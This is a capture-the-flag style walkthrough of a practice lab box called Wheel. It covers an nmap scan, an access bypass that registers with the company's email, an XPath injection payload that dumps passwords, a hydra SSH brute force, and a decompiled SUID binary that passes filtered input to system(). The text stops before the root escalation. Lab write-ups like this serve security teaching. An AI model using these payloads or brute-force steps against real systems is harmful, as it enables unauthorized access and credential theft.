### Wheel Proving Grounds Practice

### Diffifculty = Easy

### IP Address  = 192.168.66.202

Nmap Scan: 

```
                                                                                                                                                                                                                  
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
└─$ nmap -sCV -A 192.168.66.202 -p22,80 -oN nmapscan    
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-23 14:52 WAT
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 14:52 (0:00:00 remaining)
Nmap scan report for 192.168.66.202
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Wheels - Car Repair Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.16 seconds
```

Checking the web server out
![image](https://user-images.githubusercontent.com/113513376/214056907-0cff132e-a336-43bc-a3a4-1da12c12a0a7.png)

Trying to login using weak credentials failed
![image](https://user-images.githubusercontent.com/113513376/214057174-bd14ca44-d3b2-496b-a9d3-89aae1f235c6.png)

So i'll create an account then try logging in
![image](https://user-images.githubusercontent.com/113513376/214057331-807a3f76-a827-4db1-8ff1-1a307bf8ddf7.png)

```
Username: hacker
Email: hacker@localhost.com
Password: hacker
```

It was successfull in creating the account
![image](https://user-images.githubusercontent.com/113513376/214057498-2801974b-580e-453d-ab82-561c34f4cf64.png)

Now i'll login using the cred

And it works but it still looks the same
![image](https://user-images.githubusercontent.com/113513376/214059601-00f1fdc4-e6ba-4eeb-9889-ceba5829bef8.png)

Lets try accessing /portal.php

But i get access denied
![image](https://user-images.githubusercontent.com/113513376/214059777-25176a01-afa8-469e-96d5-e8b8a5c664d3.png)

Damn i guess it's cause our we aren't valid registered employee 

So looking at the home page i came across the email of the company
![image](https://user-images.githubusercontent.com/113513376/214060046-c33908ae-4d97-4f6b-8679-f1ad0e31d186.png)

So now i'll create an account with that email then try accessing the employee portal

```
Username: pwner
Email: info@wheels.service
Password: pwner
```

When i then try accessing the portal again we have access to it 
![image](https://user-images.githubusercontent.com/113513376/214060522-b8010255-0680-4426-a239-a2de9a6123a0.png)

And now we see it has a function which searches for users by services

So i'll click on search and notice the request it makes in burp

```
GET /portal.php?work=car&action=search HTTP/1.1
Host: 192.168.66.202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.66.202/portal.php?work=car&action=search
Cookie: PHPSESSID=vqqi53pl4rq3410r7jomqgb3d0
Upgrade-Insecure-Requests: 1

```

Well then i forward the request
![image](https://user-images.githubusercontent.com/113513376/214061269-61f30eb8-de08-4557-acea-e3517cdbf135.png)

So i'll search for another service again and also capture the request

```
GET /portal.php?work=bike&action=search HTTP/1.1
Host: 192.168.66.202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.66.202/portal.php?work=car&action=search
Cookie: PHPSESSID=vqqi53pl4rq3410r7jomqgb3d0
Upgrade-Insecure-Requests: 1

```

Well all i see that it includes what we search for in the url
![image](https://user-images.githubusercontent.com/113513376/214061558-fb53ec32-3093-4800-b782-0ec7552228c0.png)

I'll try tampering the url to see what happens
 
It reproduces an error that no `bike'` entity was found 
![image](https://user-images.githubusercontent.com/113513376/214061875-47e16631-6658-4f02-bb62-58fbd291c8d3.png)

```
XML Error; No bike' entity found
Warning: SimpleXMLElement::xpath(): Invalid expression in /var/www/html/portal.php on line 68
```

Well from this it looks like we're dealing with an X-PATH Injection cause from the error message i can see `xpath()`

Trying out payloads from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md

After trying the payloads from the link above 

This doesn't throw an error

```
)]/user | a[contains(a,'
```
![image](https://user-images.githubusercontent.com/113513376/214065092-b7272930-5425-450f-982f-7b7c05493f6a.png)

So instead of us trying to dump the users table which doesn't exist i'll try assume there's a password table which i'll then dump

And it works
![image](https://user-images.githubusercontent.com/113513376/214065500-90e94b7f-4df9-4d4b-b748-c806e86fd22c.png)

Now i'll save those password list in a file then brute force ssh with the users 

And to get the username is as easy as searching for a valid service
![image](https://user-images.githubusercontent.com/113513376/214065782-83438b06-9848-4f85-bd81-9d85acc037d8.png)
![image](https://user-images.githubusercontent.com/113513376/214066230-bcd2fcca-9597-4f79-bd8d-bd9e8afd842d.png)

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
└─$ nano users    
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
└─$ nano passwords
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
└─$ cat users;echo; cat passwords
bob
alice
john
dan
alex
selene

Iamrockinginmyroom1212
iamarabbitholeand7875
johnloveseverontr8932
lokieismyfav!@#12
alreadydead$%^234
lasagama90809!@
```

Now i'll brute force ssh using the userlist and password list

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
└─$ hydra -L users -P passwords ssh://192.168.66.202 -t64      
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-23 15:38:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 36 tasks per 1 server, overall 36 tasks, 36 login tries (l:6/p:6), ~1 try per task
[DATA] attacking ssh://192.168.66.202:22/
[22][ssh] host: 192.168.66.202   login: bob   password: Iamrockinginmyroom1212
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-23 15:39:06
```

Cool we have a valid cred now 

Time to login to ssh

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
└─$ ssh bob@192.168.66.202   
The authenticity of host '192.168.66.202 (192.168.66.202)' can't be established.
ED25519 key fingerprint is SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.66.202' (ED25519) to the list of known hosts.
bob@192.168.66.202's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 23 Jan 2023 02:40:37 PM UTC

  System load:  0.01              Processes:               221
  Usage of /:   60.0% of 9.78GB   Users logged in:         0
  Memory usage: 35%               IPv4 address for ens160: 192.168.66.202
  Swap usage:   0%


10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue May 17 19:22:53 2022 from 192.168.118.14
$ 
```

Cool lets escalate privilege to root

Searching for binaries that has suid perm set on it shows

```
bob@wheels:~$ find / -type f -perm -4000 2>/dev/null                                                                                                                                                               
/opt/get-list                
/usr/bin/chfn
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/chsh
```

On running the binary shows that it either opens up a customer list or an employee list

```
bob@wheels:/opt$ ./get-list 


Which List do you want to open? [customers/employees]: customers
Opening File....

Michael
Christopher
Jessica
Matthew
Ashley
Jennifer
Joshua
Amanda
Daniel
David
James
Robert
John
Joseph

```

I'll transfer the binary to my machine and decompile it using ghidra to see whats happening

```
bob@wheels:/opt$ ls
get-list
bob@wheels:/opt$ cp get-list /tmp
cd /tbob@wheels:/opt$ cd /tmp
bob@wheels:/tmp$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
```

Now i'll download it on my machine

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
└─$ rm get-list               
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
└─$ wget 192.168.66.202:8001/get-list
--2023-01-23 15:50:35--  http://192.168.66.202:8001/get-list
Connecting to 192.168.66.202:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16808 (16K) [application/octet-stream]
Saving to: _get-list_

get-list                                             100%[=====================================================================================================================>]  16.41K  70.0KB/s    in 0.2s    

2023-01-23 15:50:36 (70.0 KB/s) - _get-list_ saved [16808/16808]
```

Now i'll open it up in ghidra

Looking at the main function we see whats happening


```
undefined8 main(void)

{
  __uid_t __uid;
  char *pcVar1;
  undefined8 local_148;
  undefined8 local_140;
  undefined8 local_138;
  undefined8 local_130;
  undefined8 local_128;
  undefined8 local_120;
  undefined8 local_118;
  undefined8 local_110;
  undefined8 local_108;
  undefined8 local_100;
  undefined8 local_f8;
  undefined8 local_f0;
  undefined8 local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  char local_78 [104];
  int local_10;
  int local_c;
  
  puts("\n");
  printf("Which List do you want to open? [customers/employees]: ");
  fgets(local_78,100,stdin);
  pcVar1 = strchr(local_78,0x3b);
  if (((pcVar1 == (char *)0x0) && (pcVar1 = strchr(local_78,0x7c), pcVar1 == (char *)0x0)) &&
     (pcVar1 = strchr(local_78,0x26), pcVar1 == (char *)0x0)) {
    pcVar1 = strstr(local_78,"customers");
    if ((pcVar1 == (char *)0x0) && (pcVar1 = strstr(local_78,"employees"), pcVar1 == (char *)0x0)) {
      printf("Oops something went wrong!!");
      return 0;
    }
    puts("Opening File....\n");
    local_148 = 0;
    local_140 = 0;
    local_138 = 0;
    local_130 = 0;
    local_128 = 0;
    local_120 = 0;
    local_118 = 0;
    local_110 = 0;
    local_108 = 0;
    local_100 = 0;
    local_f8 = 0;
    local_f0 = 0;
    local_e8 = 0;
    local_e0 = 0;
    local_d8 = 0;
    local_d0 = 0;
    local_c8 = 0;
    local_c0 = 0;
    local_b8 = 0;
    local_b0 = 0;
    local_a8 = 0;
    local_a0 = 0;
    local_98 = 0;
    local_90 = 0;
    local_88 = 0;
    snprintf((char *)&local_148,200,"/bin/cat /root/details/%s",local_78);
    local_c = open("/dev/null",0x401);
    local_10 = dup(2);
    dup2(local_c,2);
    __uid = geteuid();
    setuid(__uid);
    system((char *)&local_148);
    dup2(local_10,2);
    close(local_10);
    close(local_c);
    write(2,&DAT_00102008,1);
  }
  return 0;
}
```














